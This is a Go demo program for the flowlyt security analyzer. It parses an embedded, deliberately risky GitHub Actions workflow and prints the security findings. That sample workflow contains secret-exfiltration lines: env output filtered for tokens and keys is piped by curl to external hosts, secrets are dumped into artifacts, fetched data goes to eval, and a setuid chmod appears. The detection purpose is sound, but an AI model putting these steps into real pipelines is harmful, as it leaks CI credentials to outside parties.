package main

import (
	"fmt"
	"strings"
	"time"

	"github.com/harekrishnarai/flowlyt/pkg/analysis/ast"
)

// Enhanced example workflow with complex patterns for P1 testing
const enhancedWorkflow = `
name: Enhanced Security Analysis Test

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 2 * * 1'

env:
  CI: true
  NODE_VERSION: '18'
  REGISTRY: ghcr.io

jobs:
  security-scan:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' || github.event_name == 'pull_request'
    environment: production
    permissions:
      contents: read
      security-events: write
      packages: write
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: us-east-1
          
      - name: Complex shell analysis test
        run: |
          # Test various shell patterns
          echo "Starting security analysis..."
          
          # Environment variable handling
          export SECRET_VALUE="$API_TOKEN"
          echo "Secret: $SECRET_VALUE" | base64
          
          # Network operations with potential data exfiltration
          curl -X POST -H "Authorization: Bearer $SECRET_VALUE" \
            -d "$(env | grep TOKEN)" \
            https://api.external-service.com/webhook
          
          # File operations with redirection
          env | grep -E "(SECRET|TOKEN|KEY)" > /tmp/secrets.txt
          cat /tmp/secrets.txt | curl -F "file=@-" https://upload.example.com
          
          # Command substitution with potential injection
          RESULT=$(curl -s "https://api.github.com/repos/$GITHUB_REPOSITORY")
          eval "echo $RESULT"
          
          # Privilege escalation attempt
          if [ "$EUID" -eq 0 ]; then
            sudo chmod +s /usr/bin/sensitive-tool
          fi
        env:
          API_TOKEN: ${{ secrets.API_TOKEN }}
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          
      - name: Third-party action with risks
        uses: some-org/risky-action@main
        with:
          api-key: ${{ secrets.THIRD_PARTY_API_KEY }}
          webhook-url: https://external-webhook.com/callback
          
      - name: Docker operations
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ env.REGISTRY }}/my-app:latest
          build-args: |
            SECRET_ARG=${{ secrets.BUILD_SECRET }}
            
  conditional-job:
    runs-on: ubuntu-latest
    needs: security-scan
    if: |
      always() && 
      (github.event_name == 'push' && contains(github.ref, 'refs/heads/main')) ||
      (failure() && contains(github.actor, 'dependabot'))
    steps:
      - name: Complex condition test
        run: echo "This has a very complex condition"
        
  matrix-job:
    runs-on: ${{ matrix.os }}
    if: matrix.include-security == true
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [16, 18, 20]
        include:
          - os: ubuntu-latest
            include-security: true
          - os: windows-latest  
            include-security: false
    steps:
      - name: Matrix-dependent step
        run: |
          echo "Running on ${{ matrix.os }} with Node ${{ matrix.node }}"
          if [ "${{ matrix.include-security }}" == "true" ]; then
            # Potential security risk in matrix context
            curl -d "${{ secrets.MATRIX_SECRET }}" https://matrix-endpoint.com
          fi
        env:
          MATRIX_VAR: ${{ matrix.node }}
          
  artifact-job:
    runs-on: ubuntu-latest
    needs: [security-scan]
    if: success() && !cancelled()
    steps:
      - name: Generate artifacts with sensitive data
        run: |
          mkdir -p artifacts
          echo "${{ secrets.DATABASE_URL }}" > artifacts/config.txt
          env | grep SECRET >> artifacts/env-dump.txt
          
      - name: Upload potentially sensitive artifacts
        uses: actions/upload-artifact@v4
        with:
          name: security-data
          path: artifacts/
          retention-days: 1
          
      - name: Download and process artifacts
        uses: actions/download-artifact@v4
        with:
          name: security-data
          path: downloaded/
          
      - name: Process downloaded artifacts
        run: |
          # Potential data exposure
          find downloaded/ -name "*.txt" -exec cat {} \; | \
            curl -X POST -d @- https://log-aggregator.com/intake
`

func main() {
	fmt.Println("=== Enhanced AST Analysis with P1 Improvements ===")
	
	// Create analyzer with enhanced configuration
	config := &ast.ASTConfig{
		EnableActionAnalysis:     true,
		EnableShellAnalysis:      true,
		EnableAdvancedReachability: true,
		TrustMarketplaceActions:  false, // Be more strict for demo
		MaxComplexityThreshold:   5,     // Lower threshold to catch more complex conditions
		EnableContextAnalysis:    true,
	}
	
	analyzer := ast.NewASTAnalyzerWithConfig(config)
	
	// Parse the enhanced workflow
	start := time.Now()
	workflowAST, err := analyzer.ParseWorkflow(enhancedWorkflow)
	parseTime := time.Since(start)
	
	if err != nil {
		fmt.Printf("ERROR: Failed to parse workflow: %v\n", err)
		return
	}
	
	fmt.Printf("Workflow parsed in %v\n", parseTime)
	fmt.Printf("Jobs found: %d\n", len(workflowAST.Jobs))
	
	// Perform comprehensive analysis
	start = time.Now()
	result, err := analyzer.AnalyzeWorkflowComprehensive(workflowAST)
	analysisTime := time.Since(start)
	
	if err != nil {
		fmt.Printf("ERROR: Comprehensive analysis failed: %v\n", err)
		return
	}
	
	fmt.Printf("Comprehensive analysis completed in %v\n\n", analysisTime)
	
	// Display results
	displayResults(result)
	
	// Performance summary
	fmt.Printf("\n=== Performance Summary ===\n")
	fmt.Printf("Parse time: %v\n", parseTime)
	fmt.Printf("Analysis time: %v\n", analysisTime)
	fmt.Printf("Total time: %v\n", parseTime+analysisTime)
	fmt.Printf("Total reachable nodes: %d\n", len(result.ReachabilityAnalysis))
}

func displayResults(result *ast.ComprehensiveAnalysisResult) {
	fmt.Println("=== Enhanced Analysis Results ===")
	
	// Security metrics
	metrics := result.GetSecurityMetrics()
	fmt.Printf("\n🛡️  Security Metrics:\n")
	fmt.Printf("  Total security risks: %d\n", metrics.TotalRisks)
	fmt.Printf("  High-risk actions: %d\n", metrics.HighRiskActions)
	fmt.Printf("  Untrusted actions: %d\n", metrics.UntrustedActions)
	fmt.Printf("  Dangerous shell commands: %d\n", metrics.DangerousCommands)
	fmt.Printf("  Complex conditions: %d\n", metrics.ComplexConditions)
	fmt.Printf("  Sensitive data flows: %d\n", metrics.SensitiveDataFlows)
	
	// Reachability analysis
	fmt.Printf("\n🎯 Reachability Analysis:\n")
	reachableCount := 0
	for nodeID, reachable := range result.ReachabilityAnalysis {
		if reachable {
			reachableCount++
		} else {
			fmt.Printf("  ❌ Unreachable: %s\n", nodeID)
		}
	}
	fmt.Printf("  ✅ Reachable nodes: %d/%d (%.1f%%)\n", 
		reachableCount, len(result.ReachabilityAnalysis),
		float64(reachableCount)/float64(len(result.ReachabilityAnalysis))*100)
	
	// Action analysis results
	fmt.Printf("\n🎭 Action Analysis (%d actions):\n", len(result.ActionAnalyses))
	for i, actionAnalysis := range result.ActionAnalyses {
		fmt.Printf("  Action %d: %s\n", i+1, actionAnalysis.ActionName)
		fmt.Printf("    Trusted vendor: %t\n", actionAnalysis.Metadata.TrustedVendor)
		fmt.Printf("    Source: %s\n", actionAnalysis.Metadata.Source)
		
		if len(actionAnalysis.Risks) > 0 {
			fmt.Printf("    ⚠️  Risks: %s\n", strings.Join(actionAnalysis.Risks, ", "))
		}
		
		if len(actionAnalysis.DataFlowRisks) > 0 {
			fmt.Printf("    🔄 Data flow risks: %s\n", strings.Join(actionAnalysis.DataFlowRisks, ", "))
		}
	}
	
	// Shell analysis results
	fmt.Printf("\n💻 Shell Analysis (%d commands):\n", len(result.ShellAnalyses))
	for i, shellCmd := range result.ShellAnalyses {
		fmt.Printf("  Command %d:\n", i+1)
		fmt.Printf("    Commands found: %d\n", len(shellCmd.ParsedCommands))
		fmt.Printf("    Variables: %d\n", len(shellCmd.Variables))
		fmt.Printf("    Redirections: %d\n", len(shellCmd.Redirections))
		fmt.Printf("    Pipes: %d\n", len(shellCmd.Pipes))
		fmt.Printf("    Substitutions: %d\n", len(shellCmd.Substitutions))
		
		if len(shellCmd.SecurityRisks) > 0 {
			fmt.Printf("    ⚠️  Security risks: %s\n", strings.Join(shellCmd.SecurityRisks, ", "))
		}
		
		if len(shellCmd.DataFlowRisks) > 0 {
			fmt.Printf("    🔄 Data flow risks: %s\n", strings.Join(shellCmd.DataFlowRisks, ", "))
		}
		
		// Show dangerous commands
		for _, cmd := range shellCmd.ParsedCommands {
			if cmd.Dangerous {
				fmt.Printf("    🚨 Dangerous command: %s (%s)\n", cmd.Command, cmd.Category)
			}
		}
		
		// Show sensitive variables
		for _, variable := range shellCmd.Variables {
			if variable.Sensitive {
				fmt.Printf("    🔐 Sensitive variable: %s (source: %s)\n", variable.Name, variable.Source)
			}
		}
	}
	
	// Complex conditions
	if len(result.ComplexConditions) > 0 {
		fmt.Printf("\n🧮 Complex Conditions:\n")
		for i, condition := range result.ComplexConditions {
			fmt.Printf("  Condition %d (complexity: %d):\n", i+1, condition.Complexity)
			fmt.Printf("    Expression: %s\n", condition.Expression)
			fmt.Printf("    Context dependency: %t\n", condition.ContextDependency)
			fmt.Printf("    Operators: %s\n", strings.Join(condition.Operators, ", "))
			fmt.Printf("    Functions: %s\n", strings.Join(condition.Functions, ", "))
			
			if len(condition.Github) > 0 {
				fmt.Printf("    GitHub context: %s\n", strings.Join(condition.Github, ", "))
			}
			if len(condition.Secrets) > 0 {
				fmt.Printf("    Secrets: %s\n", strings.Join(condition.Secrets, ", "))
			}
		}
	}
	
	// Data flow analysis
	fmt.Printf("\n🔄 Data Flow Analysis (%d flows):\n", len(result.DataFlows))
	criticalFlows := 0
	highFlows := 0
	
	for _, flow := range result.DataFlows {
		switch flow.Severity {
		case "CRITICAL":
			criticalFlows++
		case "HIGH":
			highFlows++
		}
	}
	
	fmt.Printf("  Critical severity flows: %d\n", criticalFlows)
	fmt.Printf("  High severity flows: %d\n", highFlows)
	fmt.Printf("  Total tainted flows: %d\n", 
		len(result.DataFlows)) // All flows in our current implementation are tainted
	
	// Show a few example flows
	if len(result.DataFlows) > 0 {
		fmt.Printf("  Example flows:\n")
		for i, flow := range result.DataFlows[:min(3, len(result.DataFlows))] {
			fmt.Printf("    Flow %d: %s → %s (%s)\n", 
				i+1, flow.SourceID, flow.SinkID, flow.Severity)
			fmt.Printf("      Risk: %s\n", flow.Risk)
		}
	}
	
	// Overall security risks
	if len(result.SecurityRisks) > 0 {
		fmt.Printf("\n⚠️  All Security Risks:\n")
		riskCounts := make(map[string]int)
		for _, risk := range result.SecurityRisks {
			riskCounts[risk]++
		}
		
		for risk, count := range riskCounts {
			if count > 1 {
				fmt.Printf("  %s (×%d)\n", risk, count)
			} else {
				fmt.Printf("  %s\n", risk)
			}
		}
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
